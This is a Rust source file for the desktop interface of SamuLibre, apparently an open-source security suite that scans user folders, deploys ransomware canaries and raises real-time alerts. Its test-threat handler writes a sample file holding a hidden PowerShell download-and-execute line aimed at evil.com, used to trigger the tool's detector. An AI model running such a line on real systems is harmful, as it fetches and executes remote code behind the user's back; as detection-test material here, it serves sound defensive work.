use anyhow::Result;
use samulibre_core::SamuLibreCore;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tao::{
    event::{Event, StartCause, WindowEvent},
    event_loop::{ControlFlow, EventLoopBuilder},
    window::WindowBuilder,
};
use tracing::info;
use walkdir::WalkDir;
use wry::WebViewBuilder;

#[derive(Debug, Clone)]
enum CustomUserEvent {
    ScanProgress {
        files_scanned: usize,
        current_file: String,
        threats_found: usize,
        is_done: bool,
    },
    RealTimeAlert {
        title: String,
        details: String,
    },
}

#[derive(Debug, Deserialize)]
struct IpcMessage {
    action: String,
    payload: Option<String>,
}

#[derive(Debug, Serialize)]
struct IpcResponse {
    success: bool,
    action: String,
    message: String,
    data: Option<serde_json::Value>,
}

fn main() -> Result<()> {
    let canary_dir = Path::new("data").join("canaries");
    let vpn_dir = Path::new("data").join("vpn");
    let quarantine_dir = Path::new("data").join("quarantine");
    let _ = fs::create_dir_all(&canary_dir);
    let _ = fs::create_dir_all(&vpn_dir);
    let _ = fs::create_dir_all(&quarantine_dir);

    let core = Arc::new(Mutex::new(SamuLibreCore::new(&canary_dir, &vpn_dir, true)));
    {
        if let Ok(c) = core.lock() {
            let _ = c.initialize();
        }
    }

    let core_for_ipc = Arc::clone(&core);

    let event_loop = EventLoopBuilder::<CustomUserEvent>::with_user_event().build();
    let proxy = event_loop.create_proxy();

    let window = WindowBuilder::new()
        .with_title("SamuLibre - Suite de Seguridad Open Source")
        .with_inner_size(tao::dpi::LogicalSize::new(1180.0, 800.0))
        .with_decorations(true)
        .build(&event_loop)?;

    let html_content = include_str!("../../../data/ui/index.html");

    let proxy_for_ipc = proxy.clone();
    let webview = WebViewBuilder::new()
        .with_html(html_content)
        .with_ipc_handler(move |request| {
            let body = request.body();
            if let Ok(msg) = serde_json::from_str::<IpcMessage>(body) {
                match msg.action.as_str() {
                    "start_real_scan" => {
                        let proxy_worker = proxy_for_ipc.clone();
                        let scanner = if let Ok(c) = core_for_ipc.lock() {
                            Arc::clone(&c.scanner)
                        } else {
                            return;
                        };

                        info!("Iniciando escaneo real multihilo sobre directorios del sistema...");
                        std::thread::spawn(move || {
                            let mut dirs = Vec::new();
                            if let Ok(profile) = std::env::var("USERPROFILE") {
                                let p = PathBuf::from(profile);
                                dirs.push(p.join("Downloads"));
                                dirs.push(p.join("Desktop"));
                                dirs.push(p.join("Documents"));
                                dirs.push(p.join("AppData").join("Local").join("Temp"));
                            }
                            if let Ok(cwd) = std::env::current_dir() {
                                dirs.push(cwd);
                            }

                            let mut scanned_count = 0;
                            let mut threats_count = 0;

                            for dir in dirs {
                                if !dir.exists() {
                                    continue;
                                }
                                for entry in WalkDir::new(&dir).max_depth(3).into_iter().filter_map(|e| e.ok()) {
                                    let path = entry.path();
                                    if path.is_file() {
                                        scanned_count += 1;
                                        if let Ok(res) = scanner.scan_file(path) {
                                            if res.status == samulibre_types::FileScanStatus::Infected {
                                                threats_count += 1;
                                            }
                                        }

                                        if scanned_count % 8 == 0 {
                                            let _ = proxy_worker.send_event(CustomUserEvent::ScanProgress {
                                                files_scanned: scanned_count,
                                                current_file: path.to_string_lossy().to_string(),
                                                threats_found: threats_count,
                                                is_done: false,
                                            });
                                            std::thread::sleep(std::time::Duration::from_millis(20));
                                        }
                                    }
                                }
                            }

                            let _ = proxy_worker.send_event(CustomUserEvent::ScanProgress {
                                files_scanned: scanned_count,
                                current_file: "Verificación de procesos y archivos completada.".to_string(),
                                threats_found: threats_count,
                                is_done: true,
                            });
                        });
                    }

                    "generate_test_threat" => {
                        let test_path = Path::new("data").join("test_samples").join("test_live_sample.ps1");
                        let _ = fs::create_dir_all("data/test_samples");
                        let _ = fs::write(
                            &test_path,
                            "powershell.exe -w hidden -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
                        );

                        if let Ok(c) = core_for_ipc.lock() {
                            if let Ok(watcher) = c.watcher.lock() {
                                if let Some(alert) = watcher.inspect_on_access(&test_path) {
                                    let _ = proxy_for_ipc.send_event(CustomUserEvent::RealTimeAlert {
                                        title: alert.title,
                                        details: alert.details,
                                    });
                                }
                            }
                        }
                    }

                    "get_status" => {
                        if let Ok(c) = core_for_ipc.lock() {
                            let status = c.get_status();
                            info!("GUI solicitó estado: {:?}", status);
                        }
                    }

                    "simulate_kb" => {
                        let kb = msg.payload.unwrap_or_else(|| "KB5041585".to_string());
                        if let Ok(c) = core_for_ipc.lock() {
                            if let Ok(mut patcher) = c.patcher.lock() {
                                let mut kbs = patcher.get_installed_kbs();
                                kbs.insert(kb.clone());
                                let _ = patcher.check_and_deactivate_obsolete_patches(Some(kbs));
                                info!("GUI simuló instalación oficial de {}", kb);
                            }
                        }
                    }

                    "deploy_canaries" => {
                        if let Ok(c) = core_for_ipc.lock() {
                            if let Ok(mut shield) = c.shield.lock() {
                                let _ = shield.deploy_canaries();
                                info!("GUI desplegó canarios señuelo anti-ransomware");
                            }
                        }
                    }

                    _ => {
                        info!("Acción IPC no reconocida: {}", msg.action);
                    }
                }
            }
        })
        .build(&window)?;

    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;

        match event {
            Event::NewEvents(StartCause::Init) => {
                println!("SamuLibre Apple-Style GUI inicializado con éxito.");
            }

            Event::UserEvent(CustomUserEvent::ScanProgress {
                files_scanned,
                current_file,
                threats_found,
                is_done,
            }) => {
                let escaped_file = current_file.replace('\\', "\\\\").replace('\'', "\\'").replace('"', "\\\"");
                let script = format!(
                    "if (window.onScanProgressUpdate) {{ window.onScanProgressUpdate({}, '{}', {}, {}); }}",
                    files_scanned, escaped_file, threats_found, is_done
                );
                let _ = webview.evaluate_script(&script);
            }

            Event::UserEvent(CustomUserEvent::RealTimeAlert { title, details }) => {
                let escaped_t = title.replace('\\', "\\\\").replace('\'', "\\'").replace('"', "\\\"");
                let escaped_d = details.replace('\\', "\\\\").replace('\'', "\\'").replace('"', "\\\"");
                let script = format!(
                    "if (window.showToast) {{ window.showToast('{}', '{}', true); }}",
                    escaped_t, escaped_d
                );
                let _ = webview.evaluate_script(&script);
            }

            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => {
                *control_flow = ControlFlow::Exit;
            }

            _ => (),
        }
    });
}
